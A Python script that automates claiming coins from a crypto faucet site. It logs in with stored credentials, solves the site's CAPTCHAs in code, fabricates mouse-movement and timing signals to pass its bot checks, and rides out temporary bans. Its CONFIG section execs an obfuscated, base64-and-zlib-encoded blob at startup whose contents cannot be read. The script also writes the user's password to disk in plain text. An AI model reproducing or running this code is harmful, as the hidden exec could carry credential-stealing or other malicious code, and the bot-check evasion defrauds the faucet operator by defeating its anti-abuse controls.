#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ARUBLE AUTO FAUCET CLAIM — Python port of aruble_faucet.js with a
FautePay-style live banner (rich).
"""

import json
import os
import re
import secrets
import sys
import time
from collections import Counter
from datetime import datetime

import requests

# ------------------- CONFIG-------------------
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==QjWVk6BgPLzOpzn8d2ABfQIez1XJeB3ns6tdHNzo1NTtI/d1pd41GzFHeTM/TlqImvUNPrJNMdGFYwYGxbdIVARkl3WCEry5g4/MxWef52ksMKABHZce+Io/bgr0k83d+EmDfuWTyicsaoroFxKiejFYGQsKWVPUIJIyoV6Pfz5G+dpHVRPQGYu95hXzkH9jbzr1ZrNO2WtTn+a+VlgQmkzMTbJ476eNzSW6Vm8NftUaEhK6Q3LD89+ePcw1q1H9/+RlkoTXXcd8Db6UGNAdrRvKkB7gmxsBjq8R4Vn/rhQAzgrFGk9wJe'))
# ---------------------------------------------

UA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36")

DEV_PROFILE = {
    "userAgent": UA,
    "language": "en-GB",
    "screen": "412x915",
    "colorDepth": 24,
    "tzOffset": -330,
    "hwConcurrency": 8,
    "platform": "Linux armv8l",
}

stop_flag = False


def now_str():
    return datetime.now().strftime("%H:%M:%S")


def log(msg):
    print(f"[{now_str()}] {msg}", flush=True)


def rnd(a, b):
    return a + (b - a) * __import__("random").random()


def cls():
    os.system("cls" if os.name == "nt" else "clear")


def clear():
    cls()


# ---------------- credentials (aruble.json) ----------------
def load_credentials():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                d = json.load(f)
            return d.get("email") or "", d.get("password") or ""
        except Exception:
            pass
    return "", ""


def save_credentials(email, password):
    data = {"email": email, "password": password}
    try:
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
        return True
    except Exception as e:
        log(f"warning: could not save {CONFIG_FILE}: {e}")
        return False


def ask_credentials(cli_email, cli_pass):
    cfg_email, cfg_pass = load_credentials()
    email = cli_email or cfg_email
    password = cli_pass or cfg_pass

    if not email:
        email = input("Email: ").strip()
    if not password:
        try:
            import getpass
            password = getpass.getpass("Password: ")
        except Exception:
            password = input("Password: ").strip()
    if not email:
        raise RuntimeError("email required")
    if not password:
        raise RuntimeError("password required")

    save_credentials(email, password)
    if (cli_email or cli_pass):
        log(f"credentials saved to {CONFIG_FILE}")
    return email, password


# ---------------- fingerprint ----------------
def get_fingerprint(profile=DEV_PROFILE):
    data = "|".join([
        profile["userAgent"], profile["language"], profile["screen"],
        str(profile["colorDepth"]), str(profile["tzOffset"]),
        str(profile["hwConcurrency"]), profile["platform"],
    ])
    h = 0
    for ch in data:
        h = ((h << 5) - h) + ord(ch)
        h &= 0xFFFFFFFF
    if h >= 0x80000000:
        h -= 0x100000000
    return "%08x" % abs(h)


# ---------------- math solver ----------------
def eval_math(q):
    m = re.search(r"(-?\d+)\s*([+\-*x×÷/])\s*(-?\d+)", q)
    if not m:
        raise RuntimeError(f"cannot parse math question: {q}")
    a, op, b = int(m.group(1)), m.group(2), int(m.group(3))
    if op == "+":
        return str(a + b)
    if op == "-":
        return str(a - b)
    if op in ("*", "x", "×"):
        return str(a * b)
    if op in ("/", "÷"):
        return str(int(a / b)) if b else str(a)
    raise RuntimeError(f"unknown op {op}")


# ---------------- http client ----------------
class ArubleClient:
    def __init__(self, verbose=True, dash=None):
        self.verbose = verbose
        self.dash = dash
        self.s = requests.Session()
        self.s.headers.update({
            "User-Agent": UA,
            "Accept": "*/*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": BASE,
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
        })
        self.csrf = None

    def log(self, msg):
        if not self.verbose:
            return
        if self.dash is not None:
            self.dash.log(msg)
        else:
            log(msg)

    def _get(self, path, referer=None):
        h = {}
        if referer:
            h["Referer"] = referer
        max_retries = 3
        for attempt in range(max_retries):
            try:
                return self.s.get(BASE + path, headers=h, timeout=30)
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
                if attempt == max_retries - 1:
                    raise e
                self.log(f"  [network warning] GET failed, retrying ({attempt + 1}/{max_retries})...")
                time.sleep(3)

    def _post_form(self, path, data, referer=None):
        h = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
        if referer:
            h["Referer"] = referer
        max_retries = 3
        for attempt in range(max_retries):
            try:
                return self.s.post(BASE + path, data=data, headers=h, timeout=30)
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
                if attempt == max_retries - 1:
                    raise e
                self.log(f"  [network warning] POST failed, retrying ({attempt + 1}/{max_retries})...")
                time.sleep(3)

    @staticmethod
    def _json(resp, what):
        try:
            return resp.json()
        except Exception:
            raise RuntimeError(f"{what}: HTTP {resp.status_code}, not JSON: {resp.text[:200]!r}")

    def init_session(self):
        r = self._get("/", referer=BASE + "/")
        if r.status_code != 200:
            raise RuntimeError(f"login page: HTTP {r.status_code}")
        m = re.search(r'csrf-token"[\s>]+content="([^"]+)"', r.text)
        if not m:
            raise RuntimeError("no csrf token in login page")
        self.csrf = m.group(1)
        self.log(f"[init] session ok, csrf={self.csrf[:16]}...")

    def fetch_challenge(self):
        j = self._json(self._get("/captcha/challenge", referer=BASE + "/"), "challenge")
        if j.get("banned"):
            self.log("  challenge: banned")
        elif j.get("gate_required"):
            self.log(f"  challenge: gate ({j.get('hold_ms', DEFAULT_HOLD_MS)}ms hold)")
        else:
            self.log(f"  challenge: {j['type']}")
        return j

    def gate_start(self):
        return self._json(self._post_form("/captcha/gate/start", {"_csrf_token": self.csrf}), "gate/start")

    def gate_complete(self, gate_key, moves):
        return self._json(self._post_form("/captcha/gate/complete", {
            "gate_key": gate_key, "moves": moves, "_csrf_token": self.csrf
        }), "gate/complete")

    def verify(self, key, answer):
        return self._json(self._post_form("/captcha/verify", {
            "key": key, "answer": answer, "_csrf_token": self.csrf
        }), "verify")

    def pass_gate(self):
        gs = self.gate_start()
        if not gs.get("success"):
            raise RuntimeError(f"gate/start failed: {gs}")
        hold_ms = int(gs.get("hold_ms", DEFAULT_HOLD_MS))
        self.log(f"  gate started (hold={hold_ms}ms)")
        time.sleep(hold_ms / 1000.0 + rnd(0.05, 0.35))
        moves = max(3, int(hold_ms / 1000.0 * rnd(12, 40)))
        gc = self.gate_complete(gs["gate_key"], moves)
        if not gc.get("success"):
            raise RuntimeError(f"gate/complete failed: {gc}")
        self.log(f"  gate passed (moves={moves})")

    @staticmethod
    def build_answer(ch):
        t = ch["type"]
        if t == "slide":
            return str(ch["target_pct"])
        if t == "icon_order":
            idmap = {it["icon"]: it["id"] for it in ch["display"]}
            seq = [idmap[icon] for icon in ch["prompt"]]
            return json.dumps(seq, separators=(",", ":"))
        if t == "least_repeat":
            counts = Counter(it["icon"] for it in ch["grid"])
            least = min(counts.values())
            return str(next(it["id"] for it in ch["grid"] if counts[it["icon"]] == least))
        if t == "drag_dot":
            return json.dumps({"x": round(ch["target_x"]), "y": round(ch["target_y"])}, separators=(",", ":"))
        raise RuntimeError(f"unknown challenge type: {t} ({ch})")

    def solve_one(self):
        for _ in range(MAX_ATTEMPTS):
            ch = self.fetch_challenge()
            if ch.get("banned"):
                raise RuntimeError(f"temp-banned: {ch.get('message', '')} (retry in {ch.get('remaining_seconds', 0)}s)")
            if ch.get("gate_required"):
                self.pass_gate()
                continue
            answer = self.build_answer(ch)
            time.sleep(rnd(0.8, 2.2))
            res = self.verify(ch["key"], answer)
            if res.get("success"):
                self.log("  captcha verified")
                return res.get("token", "")
            if res.get("banned"):
                raise RuntimeError(f"temp-banned at verify: {res.get('message', '')} (retry in {res.get('remaining_seconds', 0)}s)")
            if res.get("expired"):
                self.log("  wrong answer / expired -> fresh challenge")
                time.sleep(1.2)
                continue
            raise RuntimeError(f"verify failed: {res}")
        raise RuntimeError("too many attempts without a verifiable challenge")

    def login(self, email, password):
        token = self.solve_one()
        device_fp = secrets.token_hex(16)
        res = self._post_form("/api/auth/login", {
            "_csrf_token": self.csrf, "email": email, "password": password,
            "captcha_token": token, "remember_me": "1",
            "device_fingerprint": device_fp,
        }, referer=BASE + "/")
        ok = res.status_code == 200 and res.json().get("success")
        self.log(f"  login {'ok' if ok else 'failed'} (http {res.status_code})")
        if not ok:
            raise RuntimeError(f"login failed: {res.text[:200]}")
        return True

    def bot_check(self, return_to="/faucet"):
        page = self._get(f"/bot-check?return_to={requests.utils.quote(return_to)}", referer=BASE + "/")
        if page.status_code != 200:
            raise RuntimeError(f"bot-check page: HTTP {page.status_code}")
        token = re.search(r'name="token"\s+value="([^"]+)"', page.text)
        question = re.search(r'botcheck-question">([^<]+)<', page.text)
        math_field = re.search(r'name="(q_[a-f0-9]+)"\s+id="mathAnswer"', page.text)
        time_field = re.search(r"fieldTime:\s*'([^']+)'", page.text)
        start_ms = re.search(r"challengeStartMs:\s*(\d+)", page.text)
        if not all([token, question, math_field, time_field, start_ms]):
            raise RuntimeError("bot-check page fields not found")
        token, question, math_field, time_field = (token.group(1), question.group(1),
                                                 math_field.group(1), time_field.group(1))
        start_ms = int(start_ms.group(1))
        answer = eval_math(question)
        self.log(f"  bot-check: math {question} = {answer}")

        captcha_token = self.solve_one()
        self.log("  bot-check captcha ok")

        solve_time = max(3000, int(time.time() * 1000) - start_ms)
        seconds = solve_time / 1000.0
        mouse_moves = int(seconds * rnd(5, 14))
        linear_count = int(mouse_moves * rnd(0.1, 0.35))

        data = {
            "token": token,
            "captcha_token": captcha_token,
            "website": "",
            math_field: answer,
            time_field: solve_time,
            "mouse_moves": mouse_moves,
            "mouse_linear": linear_count,
            "integrity_signals": "",
        }
        res = self._post_form("/bot-check/verify", data, referer=BASE + "/bot-check")
        j = res.json()
        self.log("  bot-check passed")
        if not j.get("success"):
            raise RuntimeError(f"bot-check failed: {res.text[:200]}")
        return j

    def read_faucet(self):
        page = self._get("/faucet", referer=BASE + "/")
        if page.status_code != 200:
            return None
        m = re.search(r"var FAUCET_DATA = (\{[\s\S]*?\n\});", page.text)
        if not m:
            return None
        try:
            data = json.loads(m.group(1))
        except Exception:
            return None
        ct = re.search(r'id="statClaims">(\d+)<', page.text)
        return {
            "acc_balance": data.get("accBalance"),
            "coin_reward": data.get("coinReward"),
            "coin_symbol": data.get("coinSymbol"),
            "cooldown": int(data.get("cooldownSeconds", COOLDOWN_SECONDS)),
            "multiplier": data.get("multiplier"),
            "claims_today": int(ct.group(1)) if ct else None,
        }

    def faucet_status(self):
        r = self._get("/api/earn-badges", referer=BASE + "/faucet")
        j = self._json(r, "earn-badges")
        f = j.get("faucet", {}) if j else {}
        return {
            "available": bool(f.get("available")),
            "enabled": bool(f.get("enabled", True)),
            "cooldown": int(f.get("cooldown", 0)),
        }

    def claim_once(self, fp):
        time.sleep(rnd(0.6, 1.5))
        page = self._get("/faucet", referer=BASE + "/")
        if page.status_code == 401:
            raise SessionExpired("session expired")
        if page.status_code != 200:
            raise RuntimeError(f"faucet page: HTTP {page.status_code}")

        captcha_token = self.solve_one()
        self.log("  claim captcha ok")
        res = self._post_form("/faucet/claim", {
            "dest": "account", "wc_id": 0, "captcha_token": captcha_token,
            "fp": fp, "_csrf_token": self.csrf,
        }, referer=BASE + "/faucet")
        j = self._json(res, "claim")
        if j.get("success"):
            self.log(f"  claimed +{j['amount']} {j['symbol']} (balance {j['balance_after']})")
        return j


class SessionExpired(RuntimeError):
    pass


def cooldown_seconds(msg):
    m = re.search(r"(\d+)m\s*(\d+)s", msg or "")
    if m:
        return int(m.group(1)) * 60 + int(m.group(2)) + 3
    m = re.search(r"in (\d+)s", msg or "")
    if m:
        return int(m.group(1)) + 3
    return 320


def re_auth(client, email, password):
    client.init_session()
    client.login(email, password)
    client.bot_check("/faucet")
    if client.dash is not None:
        client.dash.log("re-authenticated (login + bot-check)")
    else:
        log("re-authenticated (login + bot-check)")


# ---------------- dashboard (rich live card) ----------------

try:
    from rich.console import Console, Group
    from rich.live import Live
    from rich.panel import Panel
    from rich.rule import Rule
    from rich.table import Table
    from rich.text import Text

    _RICH = True
except Exception:
    _RICH = False


def _fmt_dur(secs):
    secs = int(max(0, secs))
    h, rem = divmod(secs, 3600)
    m, s = divmod(rem, 60)
    return f"{h}h {m:02d}m {s:02d}s"


def _claim_history_panel(history):
    rows = history[-8:] if history else []
    t = Table.grid(padding=(0, 2), expand=True)
    t.add_column(justify="left", ratio=2)
    t.add_column(justify="left", ratio=1)
    t.add_column(justify="right", ratio=1)
    if not rows:
        t.add_row("[dim]no claims this session yet[/]")
    for r in rows:
        t.add_row(r["time"], f"[dim]balance[/] {r['balance']}",
                  f"[bold green]+{r['amount']} {r['symbol']}[/]")
    return t


def _progress_bar(fraction, width=30):
    filled = int(round(max(0.0, min(1.0, fraction)) * width))
    return "[" + ("#" * filled) + ("-" * (width - filled)) + "]"


class Dashboard:
    def __init__(self):
        self.logs = []
        self.is_tty = sys.stdout.isatty()
        self.live = None
        self.console = Console() if _RICH else None

    def clear(self):
        pass

    def log(self, msg):
        if self.is_tty and _RICH:
            self.logs.append(f"[{now_str()}] {msg}")
            if len(self.logs) > 8:
                self.logs.pop(0)
        else:
            print(f"[{now_str()}] {msg}", flush=True)

    def _panel(self, stats):
        now_local = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        bal = f"{stats['balance']:.2f}" if stats.get("balance") is not None else "?"
        frac = stats["done"] / stats["max"] if stats.get("max") else 0
        pct = frac * 100
        bar = _progress_bar(frac)

        table = Table.grid(padding=(0, 2), expand=True)
        table.add_column(justify="left", ratio=1)
        table.add_column(justify="left", ratio=3)
        table.add_row("[bold cyan]Worker[/]", "ARUBLE AUTO FAUCET (Python)")
        table.add_row("[bold]Account[/]", stats.get("account", "?"))
        table.add_row("[bold]Target[/]",
                      f"{stats.get('done', 0)}/{stats.get('max', 0)} claims"
                      f"{' — ALL remaining today' if stats.get('all') else ''}")
        table.add_row("[bold]Claims today[/]",
                      f"{stats.get('today', 0)}/{stats.get('today_max', 0)} | "
                      f"[bold yellow]{stats.get('remaining', 0)}[/] remaining")
        table.add_row("[bold]Device time[/]", now_local)
        table.add_row("[bold]Balance[/]", f"[bold green]{bal}[/] COINS")
        table.add_row("[bold]Cooldown[/]",
                      f"{_fmt_dur(stats.get('cooldown', 0))}"
                      + (f" | faucet [red]off[/]" if stats.get("enabled") is False else ""))
        table.add_row("[bold]Progress[/]", f"{bar} {stats['done']}/{stats['max']} ({pct:.1f}%)")
        table.add_row("[bold]Stats[/]",
                      f"success [green]{stats['success']}[/] | "
                      f"blocked [yellow]{stats['blocked']}[/] | "
                      f"bans [red]{stats['bans']}[/] | "
                      f"earned [green]+{stats.get('earned', 0):.2f}[/]")
        table.add_row("[bold]Session[/]",
                      f"bot-checks {stats['botchecks']} | re-logins {stats['relogins']}")

        hist = Table.grid(expand=True)
        hist.add_column(justify="center")
        hist.add_row("[bold]Claim History[/]")
        hist.add_row(_claim_history_panel(stats.get("history", [])))

        credit_text = Text()
        credit_text.append("Credit to BypassAllShortlinks", style="bold cyan")
        credit_text.append("\nhttps://bypassallshortlinks.space", style="bold yellow")
        credit_text.justify = "center"
        credit_panel = Panel(credit_text, border_style="magenta", padding=(0, 1))

        body = [table, Rule(style="dim"), hist, credit_panel]
        for line in self.logs[-4:]:
            body.append(Text(line, style="dim"))
        return Panel(Group(*body), border_style="cyan",
                     title=f"[bold]Device {now_local}[/]", title_align="left",
                     subtitle="[dim]COINS[/]")

    def render(self, stats):
        if not (self.is_tty and _RICH):
            return
        panel = self._panel(stats)
        if self.live is None:
            self.live = Live(panel, console=self.console,
                             refresh_per_second=4, transient=True)
            self.live.start()
        else:
            self.live.update(panel)

    def stop(self):
        if self.live is not None:
            try:
                self.live.stop()
            except Exception:
                pass
            self.live = None


def countdown(dash, stats, seconds):
    seconds = int(max(0, seconds))
    stats["cooldown"] = seconds
    for i in range(seconds):
        if stop_flag:
            break
        stats["cooldown"] = seconds - i
        dash.render(stats)
        time.sleep(1)


# ---------------- main ----------------

def _refresh_today(stats, client, msg=None):
    info = client.read_faucet()
    if info:
        try:
            stats["balance"] = float(info["acc_balance"])
        except (TypeError, ValueError):
            pass
        if info.get("claims_today") is not None:
            stats["today"] = info["claims_today"]
    stats["remaining"] = max(stats["today_max"] - stats["today"], 0)
    if msg:
        dash_ref = stats.get("_dash")
        if dash_ref:
            dash_ref.log(msg)


def main():
    global stop_flag

    args = sys.argv[1:]
    keywords = {"all", "today", "max"}
    pos = [a for a in args if not a.startswith("-")]
    non_num = [a for a in pos if not re.fullmatch(r"[0-9]+", a) and a.lower() not in keywords]
    num = next((a for a in pos if re.fullmatch(r"[0-9]+", a)), None)
    all_mode = (num is None) or any(a.lower() in keywords for a in pos)
    cli_email = non_num[0] if non_num and "@" in non_num[0] else ""
    cli_pass = non_num[1] if len(non_num) > 1 and "@" not in non_num[1] else ""
    quiet = "-q" in args

    email, password = ask_credentials(cli_email, cli_pass)
    numeric = int(num) if num else None
    max_claims = None if all_mode else numeric

    if not numeric and not all_mode:
        t = input(f"How many times to claim? (e.g., 10): ").strip()
        try:
            max_claims = int(t)
        except ValueError:
            max_claims = None

    dash = Dashboard()
    client = ArubleClient(verbose=not quiet, dash=dash)
    stats = {"balance": None, "done": 0, "max": 0, "cooldown": 0,
             "success": 0, "blocked": 0, "bans": 0, "botchecks": 1, "relogins": 0,
             "account": email, "history": [],
             "today": 0, "today_max": DAILY_CLAIM_MAX, "remaining": 0,
             "all": all_mode, "enabled": True, "earned": 0.0, "_dash": dash}

    target = None
    try:
        re_auth(client, email, password)
        fp = get_fingerprint()

        info = client.read_faucet()
        if info:
            try:
                stats["balance"] = float(info["acc_balance"])
            except (TypeError, ValueError):
                pass
            if info.get("claims_today") is not None:
                stats["today"] = info["claims_today"]
            dash.log(f"balance {info['acc_balance']} {info['coin_symbol']} | "
                     f"reward {info['coin_reward']} x{info['multiplier']} | "
                     f"claims today {info['claims_today']}/{DAILY_CLAIM_MAX}")

        st = client.faucet_status()
        stats["enabled"] = st["enabled"]
        if not st["enabled"]:
            dash.log("faucet is disabled on the site — exiting")
        stats["remaining"] = max(stats["today_max"] - stats["today"], 0)

        if max_claims is None:
            target = stats["remaining"]
        else:
            target = min(max_claims, stats["remaining"]) if stats["remaining"] > 0 else 0
        stats["max"] = target

        if target <= 0:
            dash.log(f"nothing to claim — today {stats['today']}/{stats['today_max']} "
                     f"({stats['remaining']} left)")
            if sys.stdout.isatty():
                clear()
            dash.render(stats)
            return

        dash.log(f"fp={fp} | target {target} claim(s) "
                 f"({'all remaining today' if all_mode else 'fixed count'})")
        if sys.stdout.isatty():
            clear()
        dash.render(stats)

        while stats["done"] < target:
            if stop_flag:
                break
            if all_mode:
                st = client.faucet_status()
                stats["enabled"] = st["enabled"]
                if not st["enabled"]:
                    dash.log("faucet disabled by site — stopping")
                    break
            try:
                res = client.claim_once(fp)
            except SessionExpired:
                stats["relogins"] += 1
                dash.log("session expired -> re-auth")
                re_auth(client, email, password)
                _refresh_today(stats, client)
                dash.render(stats)
                continue
            except RuntimeError as e:
                if "temp-banned" in str(e):
                    stats["bans"] += 1
                    dash.log(f"[banned] waiting {TEMP_BAN_WAIT}s")
                    stats["cooldown"] = TEMP_BAN_WAIT
                    dash.render(stats)
                    countdown(dash, stats, TEMP_BAN_WAIT)
                    continue
                raise

            if res.get("success"):
                stats["done"] += 1
                stats["success"] += 1
                try:
                    stats["balance"] = float(res.get("balance_after"))
                    stats["earned"] += float(res.get("amount", 0))
                except (TypeError, ValueError):
                    pass
                stats["today"] = int(res.get("claims_today", stats["today"]))
                stats["today_max"] = int(res.get("claims_max", stats["today_max"]))
                stats["remaining"] = max(stats["today_max"] - stats["today"], 0)
                if not all_mode:
                    stats["max"] = target
                stats["history"].append({
                    "time": now_str(),
                    "amount": res["amount"],
                    "symbol": res["symbol"],
                    "balance": res["balance_after"],
                })
                if len(stats["history"]) > 8:
                    stats["history"].pop(0)
                dash.log(f"CLAIMED +{res['amount']} {res['symbol']} "
                         f"(balance: {res['balance_after']}) [{stats['today']}/{stats['today_max']}] "
                         f"{stats['done']}/{target}")
                dash.render(stats)
                if all_mode and stats["today"] >= stats["today_max"]:
                    dash.log(f"daily cap reached ({stats['today']}/{stats['today_max']}) — done")
                    dash.render(stats)
                    break
                if stats["done"] < target:
                    countdown(dash, stats, res.get("next_claim_in", COOLDOWN_SECONDS) + rnd(3, 12))
                continue

            msg = str(res.get("message", ""))
            redirect = str(res.get("redirect", ""))
            if "bot-check" in msg or "security check" in msg or "bot-check" in redirect:
                stats["blocked"] += 1
                stats["botchecks"] += 1
                dash.log("bot-check re-required -> redoing")
                client.bot_check("/faucet")
                time.sleep(rnd(1.5, 2.5))
                dash.render(stats)
                continue
            if "login" in msg:
                stats["relogins"] += 1
                dash.log("claim says not logged in -> re-auth")
                re_auth(client, email, password)
                dash.render(stats)
                continue
            if re.search(r"\d+m\s*\d+s|in \d+s", msg):
                wait = cooldown_seconds(msg)
                stats["blocked"] += 1
                dash.log(f"cooldown: {msg if len(msg) < 80 else msg[:77] + '...'}")
                _refresh_today(stats, client)
                dash.render(stats)
                countdown(dash, stats, wait)
                continue
            dash.log(f"unknown claim response: {json.dumps(res)} — retry in 60s")
            countdown(dash, stats, 60)

    except KeyboardInterrupt:
        stop_flag = True
        dash.log("Interrupted by user")
    finally:
        stats.pop("_dash", None)
        dash.stop()
        log(f"Exited. claimed {stats['done']}/{target or 0} today {stats['today']}/{stats['today_max']} "
            f"| earned +{stats['earned']:.2f} COINS | success {stats['success']} | "
            f"blocked {stats['blocked']} | bans {stats['bans']}")


if __name__ == "__main__":
    main()
